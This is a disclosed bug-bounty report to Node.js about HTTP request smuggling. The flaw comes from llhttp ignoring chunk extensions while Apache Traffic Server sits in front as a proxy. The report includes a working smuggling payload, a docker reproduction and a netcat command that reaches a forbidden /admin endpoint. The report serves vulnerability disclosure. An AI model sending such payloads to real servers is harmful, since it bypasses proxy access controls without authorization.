# HTTP Request Smuggling due to ignoring chunk extensions

## Report Details
- **Report ID**: 1238099
- **URL**: https://hackerone.com/reports/1238099
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-06-19T08:43:05.937Z
- **Disclosed**: 2021-11-02T21:07:10.761Z

## Reporter
- **Username**: mkg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:**
The `llhttp` parser in the `http` module in Node 16.3.0 ignores chunk extensions when parsing the body of chunked requests. This leads to HTTP Request Smuggling (HRS) when a Node server is put behind an Apache Traffic Server (ATS) 9.0.0 proxy.

**Description:**
In the `chunked` transfer encoding format there can be a so called chunk extension after each chunk size. Example:
```
GET / HTTP/1.1
Host: localhost
Transfer-Encoding: chunked

5 ; a=b
hello
0

```
In the example above the chunk extension would be `; a=b`. You can read more here https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1 and here https://www.rfc-editor.org/errata/eid4667 .

`llhttp` doesn't try to parse the chunk extension properly, but simply ignores every byte until it reaches a `\r` (source: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L736-L739). By following the ABNF of chunk extensions one can see that the only allowed bytes in this area are 0x09, 0x21-0x7e and 0x80-0xff. But `llhttp` allows any byte. This is the bug.

Notably we can put a `\n` in this area. This allows us to perform HRS when combined with ATS. This is because ATS also incorrectly parses the chunked extension. ATS looks for the first `\n` character and doesn't verify whether it was preceded by a `\r`. We arrive at the following attack:

```
GET / HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

2 \nxx
4c
0

GET /admin HTTP/1.1
Host: localhost:8080
Transfer-Encoding: chunked

0

```

By sending the data above when ATS is a proxy in front of Node, ATS will see one request to `/` and Node will see two requests, one to `/` and one to `/admin`. Note that all lines are terminated by CRLF (`\r\n`) and that `\n` should be replaced with an LF character.

Usually with HRS it is possible to smuggle a request past a proxy directly to the server and then get a response for the smuggled request back to the attacker. But due to a bug in ATS where the connection hangs after a chunked request is sent, we can in this case only send a smuggled request and not see the response. But we have full control over the headers and body of the smuggled request.

Both these bugs have been reported to ATS and have not been fixed yet.

## Steps To Reproduce:

This Proof of Concept requires docker and docker-compose.

Unzip the attached `poc.zip`. Start the systems with `sudo docker-compose up --build`. Now Node can be accessed directly at http://localhost:8081 and ATS (forwarding to Node) can be accessed at http://localhost:8080

Node behaves like this:
```sh
$ curl http://localhost:8081
INDEX
$ curl http://localhost:8081/admin
ADMIN
$ curl http://localhost:8081/forbidden
FORBIDDEN
```

Note that when `/admin` is requested, then `/admin was reached!` is printed in the docker-compose terminal.

ATS behaves like this:
```sh
$ curl http://localhost:8080
INDEX
$ curl http://localhost:8080/admin
FORBIDDEN
$ curl http://localhost:8080/forbidden
FORBIDDEN
```

Note that all requests to `/admin` are rerouted to `/forbidden` by ATS. So the `/admin` endpoint can't be reached.

Now it's time to send the attack described above. This can be done by using the included `payload.py`. The attack can be sent using the following command:

```sh
python3 payload.py | nc localhost 8080
```

When the attack is sent, we see `/admin was reached!` being printed in the terminal. So we bypassed the proxy and reached `/admin`.

(As mentioned before, due to a bug in ATS, the response to the smuggled request can't be seen. If ATS would not have had the mentioned bug, then `payload2.py` could have been used to both send a request and see the response.)

## Impact

If the proxy is acting as an access control system, only allowing certain requests to come through, it can be bypassed, allowing any request to be sent.

## Attachments
- poc.zip
